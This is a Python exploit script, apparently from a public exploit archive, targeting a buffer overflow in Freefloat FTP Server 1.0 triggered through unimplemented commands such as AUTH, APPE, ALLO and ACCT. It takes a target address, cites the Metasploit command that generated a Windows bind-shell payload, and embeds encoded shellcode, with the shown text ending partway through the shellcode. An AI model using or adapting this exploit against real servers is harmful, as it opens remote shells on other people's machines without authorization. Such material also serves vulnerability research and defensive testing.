#!/usr/bin/env python
'''
Freefloat 2 exploit script: p 77
Title: Freefloat FTP 1.0 Non implemented command buffer overflows
Autor: Craig freyman (@cdlzz); Date: 20110709
Tested: XP SP3 (English)
Software Link: http://www.freefloat.com/sv/freefloat-ftp-server/freefloat-ftp-server.php
'''
import socket, sys, time, struct

if len(sys.argv) < 2:
	print "[-] Usage:%s <target addr> <command>"% sys.argv[0]+"\r"
	print "[-] For example [filename.py 192.168.1.10 PWND] would do the trick."
	print "[-] Other options: AUTH, APPE, ALLO, ACCT"
	sys.exit(0)
target = sys.argv[1]
command = sys.argv[2]
if len(sys.argv) > 2:
	platform = sys.argv[2]
#./msfpayload windows/shell_bind_tcp r | ./msfencode -e x86/shikata_ga_nai -b \"x00\xff\x0d\x0a\x3d\x20"
#[*] x86/shikata_ga_nai succeded with size 368 (iteration=1)
shellcode = ("\xbf\x5c\x2a\x11\xb3\xd9\xe5\xd9\x74\x24\xf4\x5d\x33\xc9" 
	"\xb1\x56\x83\xc5\x04\x31\x7d\x0f\x03\x7d\x53\xc8\xe4\x4f"
	"\x83\x85\x07\xb0\x53\xf6\x8e\x55\x62\x24\xf4\x1e\xd6\xf8"
	"\x7e\x72\xda\x73\xd2\x67\x69\xf1\xfb\x88\xda\xbc\xdd\xa7"
	"\xdb\x70\x32\x64\x1f\x12\x9e\x76\x73\xf4\x9f\xb8\x86\xf5"
	"\xd8\xa5\x68\xa7\xb1\xa2\xda\x58\xb5\xf7\xe6\x59\x19\x7c"

	)